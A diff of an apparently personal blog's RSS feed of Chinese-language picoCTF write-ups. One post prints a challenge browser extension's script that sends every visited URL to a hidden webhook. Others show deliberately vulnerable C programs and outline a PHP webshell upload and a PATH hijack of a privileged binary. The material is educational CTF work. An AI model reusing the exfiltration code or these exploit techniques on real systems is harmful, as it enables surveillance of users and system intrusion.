@@ -12,7 +12,7 @@
     
     <copyright>本部落格所有文章除特別聲明外，均採用 BY-NC-SA 授權協議。轉載請註明出處！</copyright>
     
-    <lastBuildDate>Mon, 10 Aug 2026 10:30:52 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 17 Sep 2026 11:30:52 +0800</lastBuildDate>
     
     
     <atom:link href="http://localhost:1313/categories/picoctf/index.xml" rel="self" type="application/rss&#43;xml" />
@@ -22,59 +22,28 @@
     
 
     <item>
-      <title>Echo Escape 1</title>
-      <link>http://localhost:1313/post/echo_escape_1/</link>
-      <pubDate>Mon, 10 Aug 2026 10:08:52 &#43;0800</pubDate>
+      <title>n0s4n1ty 1</title>
+      <link>http://localhost:1313/post/n0s4n1ty_1/</link>
+      <pubDate>Thu, 17 Sep 2026 10:30:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/echo_escape_1/</guid>
+      <guid>http://localhost:1313/post/n0s4n1ty_1/</guid>
       <description>
-        <![CDATA[<h1>Echo Escape 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>n0s4n1ty 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="原始碼">
-<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[!] Failed to open flag.txt&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">n</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fwrite</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the secure echo service!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please enter your name: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Thank you for using our service.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="解題">
+          <h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
 解題
-</h2><h3 id="解題思路">
-<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
-解題思路
-</h3><p>利用read(0, buf, 128)的oevrflow 跳到win function 取得flag</p>
+</h2><h3 id="開啟並觀察題目網頁">
+<a class="header-anchor" href="#%e9%96%8b%e5%95%9f%e4%b8%a6%e8%a7%80%e5%af%9f%e9%a1%8c%e7%9b%ae%e7%b6%b2%e9%a0%81"></a>
+開啟並觀察題目網頁
+</h3><p>發現題目後端系統是由php寫的,並且有一個上傳的功能
+<img src="/images/n0s4n1ty_1/1.webp" alt="image"></p>
+<h3 id="嘗試編寫一句話木馬並上傳">
+<a class="header-anchor" href="#%e5%98%97%e8%a9%a6%e7%b7%a8%e5%af%ab%e4%b8%80%e5%8f%a5%e8%a9%b1%e6%9c%a8%e9%a6%ac%e4%b8%a6%e4%b8%8a%e5%82%b3"></a>
+嘗試編寫一句話木馬並上傳
+</h3><p>創建一個cmd.php的文件,寫入一句話木馬</p>
         
-        <hr><p>本文2026-08-10首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-10</p>]]>
+        <hr><p>本文2026-09-17首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-09-17</p>]]>
       </description>
       
         <category>Picoctf</category>
@@ -84,42 +53,18 @@
     
 
     <item>
-      <title>format string 0</title>
-      <link>http://localhost:1313/post/format_string_0/</link>
-      <pubDate>Sun, 09 Aug 2026 17:08:52 &#43;0800</pubDate>
+      <title>heap 1</title>
+      <link>http://localhost:1313/post/heap_1/</link>
+      <pubDate>Tue, 01 Sep 2026 20:41:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/format_string_0/</guid>
+      <guid>http://localhost:1313/post/heap_1/</guid>
       <description>
-        <![CDATA[<h1>format string 0</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>heap 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="what-is-format-string-vulnerability格式化字串漏洞">
-<a class="header-anchor" href="#what-is-format-string-vulnerability%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e4%b8%b2%e6%bc%8f%e6%b4%9e"></a>
-What is Format String Vulnerability（格式化字串漏洞）?
-</h2><p>Format String Vulnerability（格式化字串漏洞） 是一種常見於 C/C++ 程式的漏洞，通常發生在程式把「使用者輸入」直接丟給 printf()、fprintf()、sprintf() 這類格式化輸出函式。<br>
-例如printf危險的寫法是</p>
-        
-        <hr><p>本文2026-08-09首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-09</p>]]>
-      </description>
-      
-        <category>Picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>heap 0 writeup</title>
-      <link>http://localhost:1313/post/heap_0/</link>
-      <pubDate>Sun, 09 Aug 2026 16:33:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/heap_0/</guid>
-      <description>
-        <![CDATA[<h1>heap 0 writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="原始碼">
-<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
-原始碼
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+          <h2 id="題目原始碼">
+<a class="header-anchor" href="#%e9%a1%8c%e7%9b%ae%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
+題目原始碼
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl">
@@ -134,7 +79,7 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">input_data</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check_win</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">safe_var</span><span class="p">,</span> <span class="s">&#34;bico&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">safe_var</span><span class="p">,</span> <span class="s">&#34;pico&#34;</span><span class="p">))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">YOU WIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">// Print flag
@@ -142,8 +87,8 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl">        <span class="n">FILE</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">FLAGSIZE_MAX</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span><span class="c1">//強制輸出到螢幕
-</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Looks like everything is still secure!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
@@ -165,7 +110,7 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Welcome to heap0!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Welcome to heap1!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="s">&#34;I put my data on the heap so it should be safe from any tampering.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
@@ -206,18 +151,7 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">print_menu</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">rval</span> <span class="o">=</span> <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">rval</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl">	    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">	<span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rval</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="c1">//printf(&#34;Invalid input. Please enter a valid choice.\n&#34;);
-</span></span></span><span class="line"><span class="cl">            <span class="c1">//fflush(stdout);
-</span></span></span><span class="line"><span class="cl">            <span class="c1">// Clear input buffer
-</span></span></span><span class="line"><span class="cl">            <span class="c1">//while (getchar() != &#39;\n&#39;);
-</span></span></span><span class="line"><span class="cl">            <span class="c1">//continue;
-</span></span></span><span class="line"><span class="cl">	    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
@@ -252,9 +186,9 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>利用選項 1 列出 2個heap位置,利用選項2 用heap overflow 從 input_data 寫入,將 safe_var 的 字串改掉,再選項 4 呼叫 check_win() ,印出flag</p>
+</h3><p>印出heap位置,計算offset,利用heap overflow滿足win function條件</p>
         
-        <hr><p>本文2026-08-09首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-09</p>]]>
+        <hr><p>本文2026-09-01首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-09-01</p>]]>
       </description>
       
         <category>Picoctf</category>
@@ -264,13 +198,135 @@ What is Format String Vulnerability（格式化字串漏洞）?
     
 
     <item>
-      <title>PIE TIME writeup</title>
-      <link>http://localhost:1313/post/pie_time/</link>
-      <pubDate>Fri, 03 Jul 2026 20:33:52 &#43;0800</pubDate>
+      <title>hash-only-2</title>
+      <link>http://localhost:1313/post/hash-only-2/</link>
+      <pubDate>Mon, 31 Aug 2026 10:37:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/pie_time/</guid>
+      <guid>http://localhost:1313/post/hash-only-2/</guid>
       <description>
-        <![CDATA[<h1>PIE TIME writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>hash-only-2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="連線題目">
+<a class="header-anchor" href="#%e9%80%a3%e7%b7%9a%e9%a1%8c%e7%9b%ae"></a>
+連線題目
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">ssh ctf-player@rescued-float.picoctf.net -p <span class="m">58909</span>
+</span></span><span class="line"><span class="cl">3f39b042 
+</span></span></code></pre></div><p><img src="/images/hash-only-2/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>接上一題,我們這次在rbash的環境執行,我們要繞過他的保護機制製作假的md5sum,並更改PATH或放入到PATH中,使程式執行我們製作的偽造指令</p>
+        
+        <hr><p>本文2026-08-31首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-31</p>]]>
+      </description>
+      
+        <category>Picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>hash-only-1</title>
+      <link>http://localhost:1313/post/hash-only-1/</link>
+      <pubDate>Fri, 28 Aug 2026 17:00:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/hash-only-1/</guid>
+      <description>
+        <![CDATA[<h1>hash-only-1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="下載題目">
+<a class="header-anchor" href="#%e4%b8%8b%e8%bc%89%e9%a1%8c%e7%9b%ae"></a>
+下載題目
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">scp -P <span class="m">56774</span> ctf-player@shape-facility.picoctf.net:~/flaghasher ./
+</span></span></code></pre></div><h2 id="用ida簡單逆向程式">
+<a class="header-anchor" href="#%e7%94%a8ida%e7%b0%a1%e5%96%ae%e9%80%86%e5%90%91%e7%a8%8b%e5%bc%8f"></a>
+用IDA簡單逆向程式
+</h2><p><img src="/images/hash-only-1/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>發現程式使用特殊權限執行,且其中用到md5sum指令卻沒指明絕對路徑,可以製作假的md5sum,並更改PATH,使程式執行我們製作的偽造指令</p>
+        
+        <hr><p>本文2026-08-28首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-28</p>]]>
+      </description>
+      
+        <category>Picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>The Add/On Trap writeup</title>
+      <link>http://localhost:1313/post/the_add_on_trap/</link>
+      <pubDate>Tue, 25 Aug 2026 14:54:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/the_add_on_trap/</guid>
+      <description>
+        <![CDATA[<h1>The Add/On Trap writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="解壓縮題目給的xpi檔">
+<a class="header-anchor" href="#%e8%a7%a3%e5%a3%93%e7%b8%ae%e9%a1%8c%e7%9b%ae%e7%b5%a6%e7%9a%84xpi%e6%aa%94"></a>
+解壓縮題目給的.xpi檔
+</h2><p><img src="/images/The_Add_On_Trap/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><p>查看每一個檔案,在background/main.js中發現可疑的程式碼</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Secret</span> <span class="n">key</span> <span class="n">must</span> <span class="n">be</span> <span class="mi">32</span> <span class="n">url</span><span class="o">-</span><span class="n">safe</span> <span class="n">base64</span><span class="o">-</span><span class="n">encoded</span> <span class="n">bytes</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">TODO</span> <span class="n">I</span> <span class="n">must</span> <span class="n">find</span> <span class="n">a</span> <span class="n">solution</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">the</span> <span class="n">key</span> <span class="n">from</span> <span class="n">here</span><span class="p">,</span> <span class="k">for</span> <span class="n">now</span> <span class="n">I</span><span class="s1">&#39;ll leave it there because I need it to encrypt the webhook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">logOnCompleted</span><span class="p">(</span><span class="n">details</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Information</span> <span class="n">to</span> <span class="n">exfiltrate</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">webhookUrl</span><span class="o">=</span><span class="s1">&#39;gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span><span class="p">:</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fetch</span><span class="p">(</span><span class="n">webhookUrl</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span><span class="p">:</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">204</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="err">`</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">the</span> <span class="n">extraction</span><span class="o">!</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">browser</span><span class="o">.</span><span class="n">webNavigation</span><span class="o">.</span><span class="n">onCompleted</span><span class="o">.</span><span class="n">addListener</span><span class="p">(</span><span class="n">logOnCompleted</span><span class="p">);</span>
+</span></span></code></pre></div><p>其中<code>const key=&quot;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&quot;</code>明顯是base64加密,我們把它進行解密
+<img src="/images/The_Add_On_Trap/2.webp" alt="image">
+取得了一個假的flag</p>
+        
+        <hr><p>本文2026-08-25首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-25</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>PIE TIME 2</title>
+      <link>http://localhost:1313/post/pie_time_2/</link>
+      <pubDate>Tue, 25 Aug 2026 00:48:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/pie_time_2/</guid>
+      <description>
+        <![CDATA[<h1>PIE TIME 2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
           <h2 id="原始碼">
 <a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
@@ -283,6 +339,20 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">segfault_handler</span><span class="p">()</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Segfault Occurred, incorrect address.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">call_functions</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your name:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34; enter the address to jump to, ex =&gt; 0x12345: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">foo</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">val</span><span class="p">;</span><span class="c1">//函式指標，並把 val 強制轉型成函式指標存進去。
+</span></span></span><span class="line"><span class="cl">  <span class="nf">foo</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
